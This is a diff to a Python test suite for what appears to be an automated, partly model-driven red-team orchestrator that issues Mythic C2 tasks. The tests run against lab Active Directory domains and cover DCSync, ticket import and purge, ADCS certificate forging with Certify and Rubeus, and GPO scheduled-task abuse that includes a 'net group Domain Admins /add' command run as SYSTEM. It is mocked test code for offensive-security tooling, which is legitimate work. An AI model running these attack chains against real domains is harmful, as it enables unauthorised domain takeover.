+        "[!] essos.local will be the domain\n[*] Object RDN : krbtgt\n[*] Credentials:\n",
+        dcsync_cmd,
+        capabilities,
+    )
+    assert no_secret_probe["krbtgt_hash_present"] is False
+    assert no_secret_verification.verdict != "achieved"
+
+
+def test_cross_domain_current_tgt_import_grants_rights_and_precheck_honors_it(monkeypatch):
     # The DCSync rights precheck blocks a premature DCSync (no replication rights, graph populated). The
-    # cross-domain forge's proof DCSync was blocked the same way — even though the imported parent-EA referral
-    # confers the right — so the wall never crossed. After the forge imports the referral, the parent right is
-    # granted and the precheck must let the proof DCSync through. Drive the REAL _engagement_issue_hook seam.
+    # cross-domain forge's proof DCSync was blocked the same way — even though the imported EA-capable child TGT
+    # confers the right and lets Windows obtain the parent referral on demand — so the wall never crossed. After
+    # the forge imports that context, the parent right is granted and the precheck must let the proof DCSync
+    # through. Drive the REAL _engagement_issue_hook seam.
     mt = _make_tools()
     mt.client = object()
 
@@ -3925,7 +4524,7 @@ def test_cross_domain_referral_import_grants_rights_and_precheck_honors_it(monke
     blocked = asyncio.run(mt._engagement_issue_hook("dcsync", params, 2))
     assert blocked is not None and "not attempted" in str(blocked)
 
-    # After the cross-domain forge imports the parent-EA referral, the parent right is granted…
+    # After the cross-domain forge imports the EA-capable current-session TGT, the parent right is granted…
     mt._cross_domain_replication_rights = {"sevenkingdoms.local"}
     mt._dcsync_precheck_blocks = {}
     # …and the precheck lets the proof DCSync through (no block).
@@ -4528,6 +5127,140 @@ def test_materialize_capability_inputs_stages_adcs_certificate_then_builder_uses
     assert pkinit["parameters"]["assembly_name"] == "Rubeus.exe"
     assert "/certificate:C:\\Windows\\Temp\\sage_forged_cert_administrator_lab_local_13.pfx" in pkinit["parameters"]["assembly_arguments"]
     assert "/ptt" not in pkinit["parameters"]["assembly_arguments"]
+
+
+def test_materialize_capability_inputs_compacts_merlin_paths_and_uses_registered_filename(monkeypatch):
+    state_dir = Path(os.environ["SAGE_ENGAGEMENT_STATE_DIR"])
+    artifact_dir = state_dir / "artifacts"
+    ca_artifact = _write_test_ca_pfx(artifact_dir / "adcs_ca_test_ca01_lab.local.pfx", "CA Secret!")
+    engagement_ledger.save({
+        "engagement_id": "test-op",
+        "hops": [
+            {
+                "id": "capability:adcs-ca-private-key-export:target=ca01;target_domain=lab.local;callback=13",
+                "effect": "adcs-ca-private-key:ca01@lab.local",
+                "status": "achieved",
+                "satisfied_effects": ["adcs-ca-private-key:ca01@lab.local"],
+                "evidence": {
+                    "artifact_present": True,
+                    "verify_verdict": "achieved",
+                    "pfx_artifact_path": str(ca_artifact),
+                },
+            }
+        ],
+    }, "test-op")
+    mt = _make_tools()
+    mt._engagement_key = "test-op"
+    calls = {}
+
+    async def fake_register_file(client, filename, contents):
+        return "ca-file-uuid"
+
+    async def fake_upload(command, parameters, file_uuid, callback_display_id, token_id=None, timeout=None):
+        mt._last_issued_task_display_id = 9002
+        calls["upload"] = {
+            "command": command,
+            "parameters": parameters,
+            "file_uuid": file_uuid,
+            "callback_display_id": callback_display_id,
+        }
+        return "Uploaded CA PFX"
+
+    monkeypatch.setattr(mythic_tools.mythic, "register_file", fake_register_file)
+    monkeypatch.setattr(mt, "upload_file_by_file_uuid", fake_upload)
+
+    materialized = json.loads(asyncio.run(mt.materialize_capability_inputs(
+        {
+            "capability": "adcs-certificate-auth",
+            "domain": "lab.local",
+            "account": "administrator",
+            "ca_host": "ca01",
+            "callback_id": "13",
+        },
+        {
+            "proof_host": "dc01.lab.local",
+            "ca_pfx_password": "CA Secret!",
+            "account_sid": "S-1-5-21-111-222-333-500",
+            "mythic_adapter": dict(mythic_capability_adapter.MERLIN_MYTHIC_ADAPTER),
+        },
+    )))
+
+    assert materialized["ok"] is True
+    assert materialized["inputs"]["ca_pfx_path"] == r".\c"
+    assert materialized["inputs"]["forged_pfx_path"] == r".\f"
+    assert calls["upload"] == {
+        "command": "upload",
+        "parameters": {
+            "filename": ca_artifact.name,
+            "path": materialized["inputs"]["ca_pfx_path"],
+        },
+        "file_uuid": "ca-file-uuid",
+        "callback_display_id": 13,
+    }
+
+    plan = json.loads(asyncio.run(mt.build_capability_commands(materialized["action"], materialized["inputs"])))
+
+    assert plan["ok"] is True
+    forge = next(command for command in plan["commands"] if command["operation"] == "adcs-certificate-forge")
+    assert forge["command"] == "execute-assembly"
+    assert forge["parameters"]["filename"] == "Certify.exe"
+    assert materialized["inputs"]["ca_pfx_path"] in forge["parameters"]["arguments"]
+    assert materialized["inputs"]["forged_pfx_path"] in forge["parameters"]["arguments"]
+    assert len(forge["parameters"]["arguments"].encode("utf-8")) <= 255
+
+
+def test_materialize_capability_inputs_fails_closed_when_adcs_upload_never_issues_task(monkeypatch):
+    state_dir = Path(os.environ["SAGE_ENGAGEMENT_STATE_DIR"])
+    artifact_dir = state_dir / "artifacts"
+    ca_artifact = _write_test_ca_pfx(artifact_dir / "adcs_ca_test_ca01_lab.local.pfx", "CA Secret!")
+    engagement_ledger.save({
+        "engagement_id": "test-op",
+        "hops": [
+            {
+                "id": "capability:adcs-ca-private-key-export:target=ca01;target_domain=lab.local;callback=13",
+                "effect": "adcs-ca-private-key:ca01@lab.local",
+                "status": "achieved",
+                "satisfied_effects": ["adcs-ca-private-key:ca01@lab.local"],
+                "evidence": {
+                    "artifact_present": True,
+                    "verify_verdict": "achieved",
+                    "pfx_artifact_path": str(ca_artifact),
+                },
+            }
+        ],
+    }, "test-op")
+    mt = _make_tools()
+    mt._engagement_key = "test-op"
+    mt._last_issued_task_display_id = 8999
+
+    async def fake_register_file(client, filename, contents):
+        return "file-uuid-1"
+
+    async def fake_upload(command, parameters, file_uuid, callback_display_id, token_id=None, timeout=None):
+        return (
+            "Parameter 'filename' for command 'upload' is a ChooseOne whose value must be the "
+            "selectable DISPLAY STRING, NOT a bare UUID."
+        )
+
+    monkeypatch.setattr(mythic_tools.mythic, "register_file", fake_register_file)
+    monkeypatch.setattr(mt, "upload_file_by_file_uuid", fake_upload)
+
+    materialized = json.loads(asyncio.run(mt.materialize_capability_inputs(
+        {
+            "capability": "adcs-certificate-auth",
+            "domain": "lab.local",
+            "account": "administrator",
+            "ca_host": "ca01",
+            "callback_id": "13",
+        },
+        {"proof_host": "dc01.lab.local", "ca_pfx_password": "CA Secret!"},
+    )))
+
+    assert materialized["ok"] is False
+    assert materialized["missing"] == ["ca_pfx_upload"]
+    assert "did not issue a Mythic task" in materialized["reason"]
+    assert "staged" not in materialized
+    assert mt._last_issued_task_display_id is None
 
 
 def test_resolve_domain_sid_falls_back_to_account_object_sid():
@@ -5212,6 +5945,26 @@ def test_kerberos_ticket_artifact_binds_inter_realm_referral_across_param_shapes
     assert untouched == {"Assembly": "Rubeus.exe", "Arguments": "triage"}
 
 
+@pytest.mark.parametrize("command", ["invoke-assembly", "invoke_assembly"])
+def test_kerberos_ticket_artifact_binds_current_session_ptt_invoke_assembly(command):
+    mt = _make_tools()
+    ticket = "Y" * 120
+    mt._capability_artifacts["kerberos_ticket_base64"] = ticket
+    args = "ptt /ticket:{{kerberos_ticket_base64}}"
+
+    shapes = [
+        {"assembly": "Rubeus.exe", "arguments": args},
+        {"assembly": "Rubeus.exe", "args": args},
+        json.dumps({"assembly": "Rubeus.exe", "arguments": args}),
+        json.dumps({"assembly": "Rubeus.exe", "args": args}),
+    ]
+    for params in shapes:
+        bound = mt._bind_kerberos_ticket_artifact(command, params)
+        blob = bound if isinstance(bound, str) else json.dumps(bound)
+        assert ticket in blob, f"ticket not substituted for shape {params!r}"
+        assert "{{kerberos_ticket_base64}}" not in blob, f"literal placeholder survived for {params!r}"
+
+
 def test_issue_task_refuses_duplicate_make_token_context():
     mt = _make_tools()
 
@@ -5673,7 +6426,7 @@ def test_contradiction_downgrade_leaves_unrelated_and_successful_alone(monkeypat
     assert da_hop is not None and da_hop.status == "achieved"
 
 
-# --- D1: assembly file availability preflight ---
+# --- Registered-file availability preflight ---
 
 def test_assembly_name_from_params_extracts_only_real_assembly():
     mt = _make_tools()
@@ -5684,74 +6437,115 @@ def test_assembly_name_from_params_extracts_only_real_assembly():
     assert mt._assembly_name_from_params({"Assembly": "not-a-binary"}) == ""
 
 
-def test_ensure_assembly_file_available_ensures_upload_without_register_task(monkeypatch):
+def _registered_file_schema(choices=None):
+    return [
+        {
+            "name": "registered_ref",
+            "cli_name": "tool",
+            "type": "ChooseOne",
+            "parameter_group_name": "Default",
+            "required": True,
+            "choices": list(choices or []),
+            "default_value": "",
+        },
+        {
+            "name": "file",
+            "cli_name": "file",
+            "type": "File",
+            "parameter_group_name": "New File",
+            "required": True,
+            "choices": [],
+            "default_value": "",
+        },
+    ]
+
+
+def test_issue_path_registers_schema_selected_file_before_resolver(monkeypatch):
     mt = _make_tools()
     ensured = []
+    invalidated = []
+
     async def fake_ensure(name):
         ensured.append(name)
         return json.dumps({"status": "already_present", "file_uuid": "uuid-1", "binary_filename": name})
+
+    async def fake_schema(command, callback_display_id):
+        assert command == "custom-runner"
+        assert callback_display_id == 2
+        return _registered_file_schema(["SharpHound.exe"] if ensured else [])
+
+    async def fake_invalidate(command, callback_display_id):
+        invalidated.append((command, callback_display_id))
+
     monkeypatch.setattr(mt, "ensure_tool_uploaded", fake_ensure)
-    async def fake_payload_type(callback_display_id):
-        return "apollo"
-    monkeypatch.setattr(mt, "_resolve_payload_type", fake_payload_type)
-    mt._cmd_schema_cache = {("apollo", "execute_assembly"): [{"name": "assembly_name", "choices": []}]}
+    monkeypatch.setattr(mt, "_fetch_command_schema", fake_schema)
+    monkeypatch.setattr(mt, "_invalidate_command_schema_cache", fake_invalidate)
 
-    async def fail_issue(*args, **kwargs):
-        raise AssertionError("assembly file preflight must not issue hidden register_assembly tasks")
+    calls = {"issue": 0}
+    with _split_issue("ran", calls):
+        result = asyncio.run(mt.issue_task_and_waitfor_task_output(
+            "custom-runner",
+            {"tool": "SharpHound.exe"},
+            2,
+        ))
 
-    monkeypatch.setattr(mythic_tools.mythic, "issue_task", fail_issue)
-    params = '{"Assembly":"SharpGPOAbuse.exe","Arguments":"--x"}'
-    asyncio.run(mt._ensure_assembly_file_available("execute_assembly", params, 2))
-    assert ensured == ["SharpGPOAbuse.exe"]
-    assert "sharpgpoabuse.exe" in mt._assembly_file_checks
-    assert ("apollo", "execute_assembly") not in mt._cmd_schema_cache
-    ensured.clear()
-    asyncio.run(mt._ensure_assembly_file_available("execute_assembly", params, 2))
-    assert ensured == []  # checked this process; do not re-query before every execute
+    assert result == "ran"
+    assert ensured == ["SharpHound.exe"]
+    assert invalidated == [("custom-runner", 2)]
+    assert "sharphound.exe" in mt._registered_file_checks
+    assert calls["issued"][0]["parameters"] == {"tool": "SharpHound.exe"}
 
 
-def test_ensure_assembly_file_available_skips_when_schema_already_has_choice(monkeypatch):
+def test_registered_file_preflight_skips_when_schema_already_has_choice(monkeypatch):
     mt = _make_tools()
 
     async def fake_schema(command, callback_display_id):
-        return [
-            {
-                "name": "assembly_name",
-                "cli_name": "Assembly",
-                "type": "ChooseOne",
-                "choices": ["Rubeus.exe"],
-                "parameter_group_name": "Default",
-            }
-        ]
+        return _registered_file_schema(["Rubeus.exe"])
 
     async def fail_ensure(name):
-        raise AssertionError("already-registered assembly should not require upload or register_assembly")
-
-    async def fail_issue(*args, **kwargs):
-        raise AssertionError("register_assembly should not be issued when schema already lists the assembly")
+        raise AssertionError("already-registered file should not require upload")
 
     monkeypatch.setattr(mt, "_fetch_command_schema", fake_schema)
     monkeypatch.setattr(mt, "ensure_tool_uploaded", fail_ensure)
-    monkeypatch.setattr(mythic_tools.mythic, "issue_task", fail_issue)
 
-    asyncio.run(mt._ensure_assembly_file_available(
-        "execute_assembly",
-        {"assembly_name": "Rubeus.exe", "assembly_arguments": "klist"},
+    asyncio.run(mt._ensure_registered_file_available(
+        "custom-runner",
+        {"tool": "Rubeus.exe"},
         3,
     ))
 
-    assert "rubeus.exe" in mt._assembly_file_checks
+    assert "rubeus.exe" in mt._registered_file_checks
 
 
-def test_ensure_assembly_file_available_skips_non_assembly_command(monkeypatch):
+def test_registered_file_preflight_skips_chooseone_without_file_group(monkeypatch):
     mt = _make_tools()
-    issued = []
-    async def fake_issue(*a, **k):
-        issued.append(1)
-        return {"display_id": 1}
-    monkeypatch.setattr(mythic_tools.mythic, "issue_task", fake_issue)
-    asyncio.run(mt._ensure_assembly_file_available("whoami", "", 2))
-    assert issued == []
+    ensured = []
+
+    async def fake_schema(command, callback_display_id):
+        return [{
+            "name": "method",
+            "cli_name": "method",
+            "type": "ChooseOne",
+            "parameter_group_name": "Default",
+            "required": True,
+            "choices": [],
+            "default_value": "",
+        }]
+
+    async def fake_ensure(name):
+        ensured.append(name)
+        return json.dumps({"status": "already_present", "file_uuid": "uuid-1"})
+
+    monkeypatch.setattr(mt, "_fetch_command_schema", fake_schema)
+    monkeypatch.setattr(mt, "ensure_tool_uploaded", fake_ensure)
+
+    asyncio.run(mt._ensure_registered_file_available(
+        "custom-runner",
+        {"method": "SharpHound.exe"},
+        2,
+    ))
+
+    assert ensured == []
 
 
 # --- Universal dcsync /user normalization (NETBIOS\sAMAccountName at the issue path) ---
@@ -5923,6 +6717,296 @@ def test_rewrite_shell_like_run_normalizes_powerpick_dict_to_raw_script():
     assert params == "$ErrorActionPreference='Continue'\nWrite-Output 'ok'"
 
 
+def _merlin_shell_schema():
+    return [
+        {
+            "name": "arguments",
+            "cli_name": "args",
+            "type": "String",
+            "parameter_group_name": "Default",
+            "required": True,
+            "choices": [],
+            "default_value": None,
+        },
+    ]
+
+
+def test_issue_path_wraps_merlin_shell_command_line_from_live_schema(monkeypatch):
+    mt = _make_tools()
+    calls = {}
+
+    async def shell_schema(command, callback_display_id):
+        assert command == "shell"
+        assert callback_display_id == 2
+        return _merlin_shell_schema()
+
+    monkeypatch.setattr(mt, "_fetch_command_schema", shell_schema)
+
+    with _split_issue("read ok", calls):
+        out = asyncio.run(mt.issue_task_and_waitfor_task_output(
+            "shell",
+            {"arguments": r"type \\north.local\SYSVOL\north.local\Policies\{GUID}\ScheduledTasks.xml"},
+            2,
+            timeout=5,
+        ))
+
+    assert out == "read ok"
+    assert calls["issued"] == [{
+        "command_name": "shell",
+        "parameters": {"args": r"type \\north.local\SYSVOL\north.local\Policies\{GUID}\ScheduledTasks.xml"},
+        "callback_display_id": 2,
+    }]
+
+
+def test_execute_capability_command_repairs_shell_parser_failure_once(monkeypatch):
+    mt = _make_tools()
+    calls = {}
+    schema_calls = {"shell": 0}
+    outputs = iter([
+        "Failed to run shell's ParseArgString function: invalid character 'y' in literal true (expecting 'r')",
+        "read ok",
+    ])
+
+    async def delayed_shell_schema(command, callback_display_id):
+        assert command == "shell"
+        schema_calls["shell"] += 1
+        return None if schema_calls["shell"] == 1 else _merlin_shell_schema()
+
+    monkeypatch.setattr(mt, "_fetch_command_schema", delayed_shell_schema)
+
+    command_obj = {
+        "command": "shell",
+        "parameters": r"type \\north.local\SYSVOL\north.local\Policies\{GUID}\ScheduledTasks.xml",
+        "purpose": "read back structured XML",
+        "expected_probe": "extract_gpo_system_exec_probe",
+        "produces": ["artifact:xml_validated"],
+        "consumes": ["artifact:gpo_immediate_task"],
+    }
+
+    with _split_issue(lambda: next(outputs), calls, display_id=7103):
+        item = asyncio.run(mt._execute_capability_command(command_obj, 2, timeout=5))
+
+    assert calls["issue"] == 2
+    assert calls["issued"][0]["parameters"] == command_obj["parameters"]
+    assert calls["issued"][1]["parameters"] == {"args": command_obj["parameters"]}
+    assert item["result_class"] == "success"
+    assert item["repair_attempt"] == 1
+    assert item["repair_kind"] == "rebuild_with_payload_schema"
+    assert item["repair_history"][0]["result_class"] == "construction"
+
+
+def _live_command_schema(command, *params):
+    return {
+        "cmd": command,
+        "commandparameters": list(params),
+        "description": "",
+    }
+
+
+def _string_param(name, *, required=True):
+    return {
+        "name": name,
+        "cli_name": name,
+        "type": "String",
+        "parameter_group_name": "Default",
+        "required": required,
+        "choices": [],
+        "default_value": None,
+    }
+
+
+def test_execute_capability_command_uses_deterministic_operation_provider_before_model_repair(monkeypatch):
+    mt = _make_tools()
+    mt._command_schema_cache["merlin"] = [
+        _live_command_schema("run", _string_param("executable"), _string_param("arguments", required=False)),
+    ]
+    resolver_calls = []
+    calls = {}
+
+    async def fake_payload_type(callback_display_id):
+        assert callback_display_id == 2
+        return "merlin"
+
+    async def fake_resolver(request):
+        resolver_calls.append(request)
+        raise AssertionError(f"catalogued provider should resolve before model repair: {request}")
+
+    monkeypatch.setattr(mt, "_resolve_payload_type", fake_payload_type)
+    mt.set_mechanic_repair_resolver(fake_resolver)
+    command_obj = {
+        "command": "ticket_cache_purge",
+        "parameters": {"all": True, "serviceName": "", "luid": ""},
+        "capability": "forge-golden-ticket",
+        "operation": "kerberos-ticket-purge",
+        "purpose": "purge current ticket cache",
+        "expected_probe": "extract_ticket_cache_probe",
+        "produces": ["kerberos_current_tickets_purged"],
+        "consumes": [],
+    }
+
+    with _split_issue("purged", calls, display_id=7104):
+        first = asyncio.run(mt._execute_capability_command(command_obj, 2, timeout=5))
+        second = asyncio.run(mt._execute_capability_command(command_obj, 2, timeout=5))
+
+    assert resolver_calls == []
+    assert [item["command_name"] for item in calls["issued"]] == ["run", "run"]
+    assert calls["issued"][0]["parameters"] == {"executable": "klist.exe", "arguments": "purge"}
+    assert first["operation_provider"]["status"] == "accepted"
+    assert first["operation_provider"]["name"] == "windows-klist-purge"
+    assert first["operation_provider"]["original_command"] == "ticket_cache_purge"
+    assert first["operation_provider"]["replacement_command"] == "run"
+    assert second["operation_provider"]["status"] == "accepted"
+
+
+def test_execute_capability_command_repairs_unknown_payload_binding_once(monkeypatch):
+    mt = _make_tools()
+    mt._command_schema_cache["merlin"] = [
+        _live_command_schema("run", _string_param("executable"), _string_param("arguments", required=False)),
+    ]
+    resolver_calls = []
+    calls = {}
+
+    async def fake_payload_type(callback_display_id):
+        assert callback_display_id == 2
+        return "merlin"
+
+    async def fake_resolver(request):
+        resolver_calls.append(request)
+        assert request["operation"] == "custom-ticket-purge"
+        assert request["original"]["command"] == "agent_ticket_purge"
+        return {
+            "command": "run",
+            "parameters": {"executable": "klist.exe", "arguments": "purge"},
+            "rationale": "payload-specific fallback",
+        }
+
+    monkeypatch.setattr(mt, "_resolve_payload_type", fake_payload_type)
+    mt.set_mechanic_repair_resolver(fake_resolver)
+    command_obj = {
+        "command": "agent_ticket_purge",
+        "parameters": {"all": True, "serviceName": "", "luid": ""},
+        "capability": "forge-golden-ticket",
+        "operation": "custom-ticket-purge",
+        "purpose": "purge current ticket cache",
+        "expected_probe": "extract_ticket_cache_probe",
+        "produces": ["kerberos_current_tickets_purged"],
+        "consumes": [],
+    }
+
+    with _split_issue("purged", calls, display_id=7104):
+        first = asyncio.run(mt._execute_capability_command(command_obj, 2, timeout=5))
+        second = asyncio.run(mt._execute_capability_command(command_obj, 2, timeout=5))
+
+    assert len(resolver_calls) == 1
+    assert [item["command_name"] for item in calls["issued"]] == ["run", "run"]
+    assert first["mechanic_repair"]["status"] == "accepted"
+    assert second["mechanic_repair"]["status"] == "accepted"
+
+
+def test_execute_capability_command_requires_rebuild_for_multistep_ticket_import_provider(monkeypatch):
+    mt = _make_tools()
+    mt._command_schema_cache["merlin"] = [
+        _live_command_schema(
+            "load-assembly",
+            _string_param("filename"),
+        ),
+        _live_command_schema(
+            "invoke-assembly",
+            _string_param("assembly"),
+            _string_param("arguments", required=False),
+        ),
+    ]
+    calls = {}
+
+    async def fake_payload_type(callback_display_id):
+        assert callback_display_id == 2
+        return "merlin"
+
+    monkeypatch.setattr(mt, "_resolve_payload_type", fake_payload_type)
+    command_obj = {
+        "command": "ticket_cache_add",
+        "parameters": {"base64ticket": "{{kerberos_ticket_base64}}"},
+        "capability": "forge-golden-ticket",
+        "operation": "kerberos-ticket-import",
+        "purpose": "import current ticket",
+        "expected_probe": "extract_ticket_cache_probe",
+        "produces": ["kerberos_ticket_imported"],
+        "consumes": ["kerberos_ticket_base64"],
+    }
+
+    with _split_issue("should not issue", calls, display_id=7105):
+        item = asyncio.run(mt._execute_capability_command(command_obj, 2, timeout=5))
+
+    assert calls == {}
+    assert item["operation_provider"]["name"] == "managed-rubeus-ptt"
+    assert item["operation_provider"]["kind"] == "external-tool"
+    assert item["operation_provider"]["status"] == "failed"
+    assert item["result_class"] == "construction"
+    assert "requires setup command 'load-assembly'" in item["failure_reason"]
+
+
+def test_execute_capability_command_rejects_shell_repair_when_run_exists(monkeypatch):
+    mt = _make_tools()
+    mt._command_schema_cache["merlin"] = [
+        _live_command_schema("run", _string_param("executable"), _string_param("arguments", required=False)),
+        _live_command_schema("shell", _string_param("arguments")),
+    ]
+    calls = {}
+
+    async def fake_payload_type(_callback_display_id):
+        return "merlin"
+
+    async def fake_resolver(_request):
+        return {
+            "command": "shell",
+            "parameters": {"arguments": "klist purge"},
+            "rationale": "use a shell",
+        }
+
+    monkeypatch.setattr(mt, "_resolve_payload_type", fake_payload_type)
+    mt.set_mechanic_repair_resolver(fake_resolver)
+    command_obj = {
+        "command": "ticket_cache_purge",
+        "parameters": {"all": True, "serviceName": "", "luid": ""},
+        "capability": "forge-golden-ticket",
+        "operation": "custom-ticket-purge",
+        "purpose": "purge current ticket cache",
+        "expected_probe": "extract_ticket_cache_probe",
+    }
+
+    with _split_issue("should not issue", calls):
+        item = asyncio.run(mt._execute_capability_command(command_obj, 2, timeout=5))
+
+    assert calls == {}
+    assert item["result_class"] == "construction"
+    assert item["mechanic_repair"]["status"] == "failed"
+    assert "shell substitute rejected" in item["failure_reason"]
+
+
+def test_issue_path_blocks_command_absent_from_live_payload_surface(monkeypatch):
+    mt = _make_tools()
+    mt._command_schema_cache["merlin"] = [
+        _live_command_schema("run", _string_param("executable"), _string_param("arguments", required=False)),
+    ]
+    calls = {}
+
+    async def fake_payload_type(_callback_display_id):
+        return "merlin"
+
+    monkeypatch.setattr(mt, "_resolve_payload_type", fake_payload_type)
+
+    with _split_issue("should not issue", calls):
+        output = asyncio.run(mt.issue_task_and_waitfor_task_output(
+            "ticket_cache_purge",
+            {"all": True, "serviceName": "", "luid": ""},
+            2,
+            timeout=5,
+        ))
+
+    assert calls == {}
+    assert "not available on live payload 'merlin'" in output
+
+
 def test_raw_gpo_mutation_powerpick_is_blocked_before_issue():
     mt = _make_tools()
     script = (
@@ -5994,6 +7078,59 @@ def test_deterministic_gpo_capability_powerpick_mutation_is_allowed():
 
     assert result == "capability ok"
     assert calls["issued"][0]["parameters"] == script
+
+
+def test_deterministic_gpo_structured_artifact_read_does_not_record_effect():
+    mt = _make_tools()
+
+    async def no_schema(command, callback_display_id):
+        return []
+
+    async def no_validation(command, parameters, callback_display_id):
+        return None
+
+    action = capabilities.CapabilityAction(
+        name="gpo-controlled-system-exec",
+        target="gpo=starkwallpaper;domain=north.sevenkingdoms.local",
+        preconditions=["generic-write:gpo:starkwallpaper"],
+        effects=["system-exec:gpo:starkwallpaper@north.sevenkingdoms.local"],
+        intent={
+            "capability": "gpo-controlled-system-exec",
+            "domain": "north.sevenkingdoms.local",
+            "gpo": "starkwallpaper",
+            "callback_id": "3",
+        },
+    )
+    params = (
+        r"type \\north.sevenkingdoms.local\SYSVOL\north.sevenkingdoms.local\Policies\{GUID}"
+        r"\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
+    )
+    mt._deterministic_capability_command_contexts[
+        mythic_tools._capability_command_key("shell", params)
+    ] = {
+        "capability": action.name,
+        "target": action.target,
+        "effects": list(action.effects),
+        "intent": dict(action.intent),
+        "action": asdict(action),
+        "purpose": "read back the structured setup artifact and validate it before waiting on effects",
+        "expected_probe": "extract_gpo_system_exec_probe",
+        "produces": ["artifact:xml_validated"],
+        "consumes": ["artifact:gpo_immediate_task"],
+    }
+    mt._fetch_command_schema = no_schema
+    mt._validate_command_parameters = no_validation
+    output = (
+        "<ScheduledTasks><Task><Properties><Author>NT AUTHORITY\\SYSTEM</Author>"
+        "<Arguments>/c net group &quot;Domain Admins&quot; samwell.tarly /add /domain</Arguments>"
+        "</Properties></Task></ScheduledTasks>"
+    )
+
+    with _split_issue(output, display_id=7105):
+        result = asyncio.run(mt.issue_task_and_waitfor_task_output("shell", params, 3, timeout=5))
+
+    assert "NT AUTHORITY\\SYSTEM" in result
+    assert mt._engagement_hops == []
 
 
 def test_delayed_capability_proof_poll_bypasses_duplicate_failure_breaker():
